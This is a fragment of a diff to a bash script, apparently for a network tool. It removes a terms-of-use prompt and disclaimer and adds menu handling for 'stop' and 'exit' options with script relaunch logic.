-	echo -e "This tool is only for educational purposes only."
-	sleep 2
-	echo -e "Use this tool only on your own network and never without permission."
-	sleep 2
-	echo -e "I am not responsible for anything you do with this tool."
-	sleep 2
-	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
-	read YESORNO
-	if [ "$YESORNO" = "YES" ]
-	then 
-		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
-		sleep 1
+	elif [ "$YORNAA" = "stop" ]
+	then
+		stop_menu
+	elif [ "$YORNAA" = "exit" ]
+	then
 		clear
+		exit
 	fi
-	exec bash "$0"
+	if [ "$BACKL" = "1" ]
+	then
+		exec bash "$0"
+		
+	else
+		echo -e "$PAKTGB"
+		$READAK
+		exec bash "$0"
+	fi
+else
+	terms_of_use
 fi
